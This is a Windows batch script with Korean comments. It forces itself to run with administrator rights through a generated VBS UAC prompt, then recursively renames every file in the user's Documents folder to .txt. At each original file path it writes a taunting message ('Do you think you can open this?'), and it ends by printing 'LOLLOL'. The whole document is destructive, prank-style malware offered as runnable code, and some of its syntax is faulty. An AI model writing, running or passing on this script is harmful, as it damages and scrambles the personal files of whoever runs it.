@echo off
:: 관리자 권한 체크
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo 관리자 권한이 필요합니다.
    echo 관리자 권한으로 프로그램을 다시 실행합니다.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: 작업 디렉토리 지정
set targetDir=C:\Users\%username%\Documents

:: 특정 디렉토리로 이동
cd /d %targetDir%

:: 시스템 디렉토리 목록 (이 디렉토리는 제외)
set "systemDirs=Windows Program Files Program Files (x86) ProgramData"

:: 파일 확장자 변경 및 내용 수정
for /r %%f in (*) do (
    if /i not "%%~dpnx"=="%~dp0%~nx0" (
        set "skip=0"
        for %%d in (%systemDirs%) do (
            if /i "%%~dpf"=="%%~d" (
                set "skip=1"
            )
        )
        if !skip! EQU 0 (
            ren "%%f" "%%~nf.txt"
            echo 이걸 열수 있을꺼라 생각하나? > "%%~dpnxf"
        )
    )
)

:: 완료 메시지
echo LOLLOL
pause
